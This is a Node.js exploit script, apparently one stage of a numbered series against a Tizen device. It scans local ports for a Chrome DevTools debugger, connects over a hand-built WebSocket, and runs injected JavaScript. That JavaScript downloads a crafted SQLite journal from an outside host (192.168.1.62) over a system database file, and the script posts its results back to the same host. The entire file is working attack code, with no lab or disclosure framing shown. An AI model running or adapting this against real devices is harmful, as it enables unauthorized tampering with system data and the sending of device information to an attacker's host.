"use strict";
/* p24: CDP via raw WS — probe port 9013 (found in p23), get wsUrl, deliver journal via Download API */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var http = require('http');
var crypto = require('crypto');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p24', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }
function run(cmd, timeout){
  try { return cp.execSync(cmd, {timeout:timeout||30000, maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
var JURL = 'http://192.168.1.62:9999/appctx_hot_journal';
var JDEST = '/opt/dbspace/.app-context.db-journal';

function wsFrameText(str){
  var payload = Buffer.from(str, 'utf8');
  var len = payload.length;
  var mask = crypto.randomBytes(4);
  var lenBytes;
  if (len < 126) { lenBytes = Buffer.from([0x80 | len]); }
  else if (len < 65536) { lenBytes = Buffer.concat([Buffer.from([0x80|126]), Buffer.from([ (len>>8)&0xff, len&0xff ])]); }
  else { lenBytes = Buffer.concat([Buffer.from([0x80|127]), Buffer.from([0,0,0,0]), Buffer.from([ (len>>>24)&0xff,(len>>>16)&0xff,(len>>>8)&0xff, len&0xff ])]); }
  var masked = Buffer.alloc(len);
  for (var i=0;i<len;i++){ masked[i] = payload[i] ^ mask[i % 4]; }
  return Buffer.concat([Buffer.from([0x81]), lenBytes, mask, masked]);
}
function parseFrames(buf, handlers){
  var pos = 0;
  while (true) {
    if (buf.length - pos < 2) return buf.slice(pos);
    var b0 = buf[pos], b1 = buf[pos+1];
    var opcode = b0 & 0x0f;
    var masked = (b1 & 0x80) !== 0;
    var len = b1 & 0x7f;
    var p = pos + 2;
    if (len === 126) { if (buf.length-p < 2) return buf.slice(pos); len = buf.readUInt16BE(p); p += 2; }
    else if (len === 127) { if (buf.length-p < 8) return buf.slice(pos); len = Number(buf.readUInt32BE(p+4)); p += 8; }
    var maskKey = null;
    if (masked) { if (buf.length-p < 4) return buf.slice(pos); maskKey = buf.slice(p, p+4); p += 4; }
    if (buf.length - p < len) return buf.slice(pos);
    var payload = buf.slice(p, p+len);
    if (masked) { var m = Buffer.alloc(len); for (var i=0;i<len;i++){ m[i] = payload[i] ^ maskKey[i%4]; } payload = m; }
    p += len;
    if (opcode === 0x8) { handlers.onClose && handlers.onClose('server close'); }
    else if (opcode === 0x9) { handlers.onPing && handlers.onPing(); }
    else if (opcode === 0x1 || opcode === 0x2) { handlers.onMessage && handlers.onMessage(payload.toString('utf8')); }
    pos = p;
    if (pos >= buf.length) return Buffer.alloc(0);
  }
}
function WSClient(port, path, handlers){
  var socket = net.connect(port, '127.0.0.1');
  var buf = Buffer.alloc(0);
  var upgraded = false;
  var pending = [];
  socket.setTimeout(20000);
  socket.on('connect', function(){
    var key = crypto.randomBytes(16).toString('base64');
    var req = 'GET ' + path + ' HTTP/1.1\r\n' +
      'Host: 127.0.0.1:' + port + '\r\n' +
      'Upgrade: websocket\r\n' +
      'Connection: Upgrade\r\n' +
      'Sec-WebSocket-Key: ' + key + '\r\n' +
      'Sec-WebSocket-Version: 13\r\n' +
      '\r\n';
    socket.write(req);
  });
  socket.on('data', function(chunk){
    buf = Buffer.concat([buf, chunk]);
    if (!upgraded) {
      var idx = buf.indexOf('\r\n\r\n');
      if (idx >= 0) {
        var header = buf.slice(0, idx).toString();
        if (header.indexOf('101') >= 0) {
          upgraded = true;
          buf = buf.slice(idx + 4);
          pending.forEach(function(f){ socket.write(f); });
          pending = [];
        } else {
          handlers.onError && handlers.onError('WS upgrade failed: ' + header.substring(0,200));
          socket.destroy();
        }
      }
      return;
    }
    try { buf = parseFrames(buf, { onMessage: handlers.onMessage, onClose: handlers.onClose, onPing: function(){} }); }
    catch(e){ handlers.onError && handlers.onError('parse: '+e); }
  });
  socket.on('error', function(e){ handlers.onError && handlers.onError(String(e)); });
  socket.on('timeout', function(){ socket.destroy(); });
  socket.on('close', function(){ handlers.onClose && handlers.onClose('socket close'); });
  return { send: function(str){ var f = wsFrameText(str); if (!upgraded) pending.push(f); else socket.write(f); }, close: function(){ socket.destroy(); } };
}

function finish(){ R.results.final='done '+new Date().toISOString(); postRaw('/p24info', JSON.stringify(R)); L('p24 done'); }
R.results.live_before = run('md5sum /opt/dbspace/.app-context.db 2>&1', 10000);
R.results.journal_before = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);

function probeJson(port, cb){
  var req = http.get({ host:'127.0.0.1', port: port, path:'/json', timeout: 2000 }, function(res){
    var data = '';
    res.on('data', function(c){ data += c; });
    res.on('end', function(){ cb(port, data, null); });
  });
  req.on('error', function(e){ cb(port, null, 'connerr'); });
  req.on('timeout', function(){ req.abort(); cb(port, null, 'timeout'); });
}

function connectTo(port, rawJson){
  R.results.chosen_port = port;
  R.results.json_raw = String(rawJson).substring(0, 1200);
  var targets;
  try { targets = JSON.parse(rawJson); } catch(e){ R.results.json_parse_err = String(e); R.results.note='json parse failed'; finish(); return; }
  var wsUrl = null, title = '', turl='';
  if (targets && Array.isArray(targets)) {
    for (var i=0;i<targets.length;i++){
      var t = targets[i];
      if (t.webSocketDebuggerUrl) { wsUrl = t.webSocketDebuggerUrl; title = t.title||''; turl=t.url||''; break; }
    }
  } else if (targets && targets.webSocketDebuggerUrl) {
    wsUrl = targets.webSocketDebuggerUrl; title = 'single';
  }
  R.results.target_title = String(title).substring(0,300);
  R.results.target_url = String(turl).substring(0,300);
  if (!wsUrl) { R.results.note='no webSocketDebuggerUrl in '+rawJson.substring(0,200); finish(); return; }
  var m = wsUrl.match(/^ws:\/\/[^\/]+(\/.*)$/);
  if (!m) { R.results.note='bad wsUrl '+wsUrl; finish(); return; }
  var wsPath = m[1];
  var ws = WSClient(port, wsPath, {
    onMessage: function(text){
      try {
        var msg = JSON.parse(text);
        if (msg.id === 101) {
          R.results.eval_setup = JSON.stringify(msg.result ? (msg.result.result ? msg.result.result.value : msg.result) : msg).substring(0,800);
          setTimeout(function(){ ws.send(JSON.stringify({ id:102, method:'Runtime.evaluate', params:{ expression:'JSON.stringify(window.__dl)', returnByValue:true } })); }, 20000);
        }
        if (msg.id === 102) {
          R.results.eval_readback = JSON.stringify(msg.result ? (msg.result.result ? msg.result.result.value : msg.result) : msg).substring(0,800);
          R.results.journal_after = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);
          R.results.dbspace_after = run('ls -la /opt/dbspace/ 2>&1 | grep -iE "app-context" | head -20', 10000);
          ws.close();
          finish();
        }
      } catch(e){ R.results.cdp_parse_err = String(e); }
    },
    onClose: function(why){ R.results.ws_close = why; },
    onError: function(e){ R.results.ws_error = String(e); }
  });
  setTimeout(function(){ ws.send(JSON.stringify({ id:100, method:'Runtime.enable', params:{} })); }, 800);
  var setupJS = '(function(){ window.__dl={start:Date.now(),tizen:typeof tizen,dl:(typeof tizen!=="undefined")?typeof tizen.download:"none",status:"pending",progress:"",err:"",done:""}; try{ tizen.download.download('+JSON.stringify(JURL)+', '+JSON.stringify(JDEST)+', function(d,t){window.__dl.progress=d+"/"+t;}, function(e){window.__dl.err=String(e&&e.message||e);window.__dl.status="error";}, function(d,t){window.__dl.done=d+"/"+t;window.__dl.status="complete";}); window.__dl.status="started"; }catch(e){window.__dl.err=String(e);window.__dl.status="exception";} return JSON.stringify(window.__dl); })()';
  setTimeout(function(){ ws.send(JSON.stringify({ id:101, method:'Runtime.evaluate', params:{ expression: setupJS, returnByValue:true } })); }, 2000);
}

// probe 9013 first (found in p23); if no good target, scan a few neighbors
probeJson(9013, function(port, raw, err){
  if (raw && raw.indexOf('webSocketDebuggerUrl') >= 0) {
    connectTo(port, raw);
    return;
  }
  R.results.port9013_raw = String(raw||err).substring(0,400);
  // fallback: scan 9000-9060
  var ports = [];
  for (var p=9000; p<9060; p++) ports.push(p);
  var idx=0, done=0, found=null;
  function scanNext(){
    if (found) { connectTo(found.port, found.raw); return; }
    if (idx >= ports.length) { R.results.note='no CDP target found'; finish(); return; }
    var batch = ports.slice(idx, idx+20); idx += 20;
    var d=0;
    batch.forEach(function(pt){
      probeJson(pt, function(pt, raw, err){
        if (!found && raw && raw.indexOf('webSocketDebuggerUrl')>=0) found={port:pt, raw:raw};
        d++;
        if (d>=batch.length) scanNext();
      });
    });
  }
  scanNext();
});
